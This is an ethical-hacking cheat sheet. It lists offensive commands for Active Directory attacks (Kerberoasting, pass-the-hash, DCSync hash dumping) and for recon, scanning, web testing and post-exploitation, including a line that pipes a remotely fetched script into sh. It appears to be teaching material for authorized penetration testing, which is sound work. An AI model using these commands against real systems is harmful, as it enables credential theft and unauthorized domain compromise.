# Ethical Hacking — Advanced

## Active Directory Attacks

```bash
# AD is the most common target in enterprise pen tests
# Most Windows networks use AD for authentication

# Enumeration (from Linux with valid creds)
impacket-GetADUsers -all -dc-ip 192.168.1.10 DOMAIN/user:password
impacket-GetUserSPNs DOMAIN/user:password -dc-ip 192.168.1.10  # Kerberoastable accounts
ldapsearch -x -H ldap://192.168.1.10 -D "user@domain" -w "password" -b "DC=domain,DC=com"

# BloodHound — visualize AD attack paths
# Collect data (SharpHound on Windows, bloodhound-python on Linux)
bloodhound-python -u user -p pass -d domain.com -c All -ns 192.168.1.10
# Open BloodHound → Import → Find shortest path to Domain Admin

# Kerberoasting — crack service account hashes
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip 192.168.1.10 -request
hashcat -m 13100 spn-hashes.txt /usr/share/wordlists/rockyou.txt

# Pass-the-Hash (NTLM)
evil-winrm -i 192.168.1.10 -u administrator -H "NTLM_HASH"
impacket-psexec DOMAIN/admin@192.168.1.10 -hashes :NTLM_HASH

# DCSync — dump all domain hashes (requires DC replication privileges)
impacket-secretsdump DOMAIN/admin@192.168.1.10 -hashes :NTLM_HASH
```

## Ethical Hacking Cheatsheet

```bash
# ── RECON ─────────────────────────────────────────────────
theHarvester -d target.com -b all   # Email/subdomain harvesting
shodan search org:"Target Corp"     # Internet-exposed assets
amass enum -d target.com            # Subdomain enumeration
whois target.com                    # Domain registration info
curl "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# ── SCANNING ──────────────────────────────────────────────
nmap -sV -sC -p- --min-rate=1000 target > scan.txt
nikto -h https://target.com -output nikto.txt
nuclei -u https://target.com -severity critical,high

# ── WEB TESTING ───────────────────────────────────────────
gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt
wfuzz -c -z file,wordlist.txt --hc 404 https://target/FUZZ
sqlmap -u "https://target/page?id=1" --dbs --batch
ffuf -u https://target/FUZZ -w wordlist.txt

# ── EXPLOITATION ──────────────────────────────────────────
msfconsole                          # Start Metasploit
searchsploit apache 2.4             # Search ExploitDB
python3 exploit.py target 443       # Custom exploit

# ── POST-EXPLOITATION ─────────────────────────────────────
# Linux privesc enumeration
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
find / -perm -4000 2>/dev/null      # SUID binaries
sudo -l                             # Sudo privileges
cat /etc/crontab                    # Cron jobs
env                                  # Environment variables (check for secrets)

# ── REPORTING TEMPLATE ────────────────────────────────────
# Executive Summary (business risk, not technical)
# Technical Findings (per vulnerability):
#   - Title, CVSS Score, Evidence/PoC, Impact, Remediation
# Appendix: Tools used, scope, methodology
```
